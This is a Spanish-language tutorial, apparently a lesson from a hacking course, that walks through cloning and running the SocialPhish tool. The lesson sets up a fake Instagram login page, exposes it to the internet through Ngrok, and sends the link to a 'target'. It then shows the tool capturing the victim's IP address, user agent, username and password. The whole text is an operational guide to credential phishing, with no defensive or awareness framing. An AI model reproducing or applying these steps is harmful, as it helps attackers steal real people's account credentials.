# 39. Phishing con SocialPhish

Vamos a ver a cómo hacer un ataque de phishing con una herramienta diferente llamada **SocialPhish**.

## Instalación y configuración de SocialPhish

* Repositorio de GitHub (original): [SocialPhish](https://github.com/xHak9x/SocialPhish)
* Repositorio de GitHub encontrado: [SocialPhish](https://github.com/TYehan/SocialPhish)

Lo que tenemos que hacer es copiar el link de la herramienta y acá nos da los pasos de la instalación. Ponemos un:

```bash
git clone https://github.com/TYehan/SocialPhish.git
```

Una vez que ya se clonó la herramienta. Vamos a hacer un:

```bash
cd SocialPhish
ls
```

Archivos: **LICENSE**, **README.md**, **sites** (directorio), **socialphish.sh**.

Tenemos un archivo `bash`, vamos a hacer un:

```bash
chmod +x socialphish.sh
```

Osea, le vamos a dar permiso de ejecución a este archivo.

## Uso de SocialPhish

Ahora, vamos a hacer un:

```bash
bash socialphish.sh
```

Tenemos varias opciones para hacer el ataque de phishing.

Vamos a hacer un ataque de phishing en la página de Instagram, Facebook, Snapchat, Twitter, GitHub, Google, Spotify, Netflix, PayPal.

Bueno, vamos a seleccionar Instagram:

```plaintext
[*] Choose an option: 1
```

Después tenemos estas dos opciones de **port forwarding**:

```plaintext
[01] Serveo.net (SSH Tunelling, Best!)
[02] Ngrok
```

Vamos a elegir Ngrok, porque es la que más se utiliza:

```plaintext
[*] Choose a Port Forwarding option: 2
[*] Downloading Ngrok ...
```
Se va a estar instalando Ngrok.

**Ngrok, ¿para qué sirve esto del port forwarding?** La página de phishing está montada, subida en un ámbito local, está montada en un
servidor Apache.

Por lo tanto, si una persona fuera de nuestra red local quiere acceder a una página de phishing que nosotros creamos en una red local nuestra, no
va a poder acceder. Lo que hace el **port forwarding**, en este caso, lo que hace Ngrok, es que esta página sea accesible por medio de fuera de
nuestra red.

Vamos a copiar el link de el phishing:

```plaintext
[*] Send this link to the Target: <link-phishing>
```

Vamos a pegarlo en el navegador.

Cuando ingresamos nos da la página de Instagram, vamos a poner un email y contraseña.

Vamos a darle **Log in** y tenemos las credenciales de la víctima y la dirección IP:

```plaintext
[*] Waiting victim open the link ...

[*] IP Found!
[*] Victim IP: <ip>
[*] Victim IP: User-Agent:
...
[*] Saved: instagram/saved.ip.txt


[*] Waiting credentials ...

[*] Credentials Found!
[*] Account: admin
[*] Password: 1234
[*] Saved: sites/instagram/saved.usernames.txt
```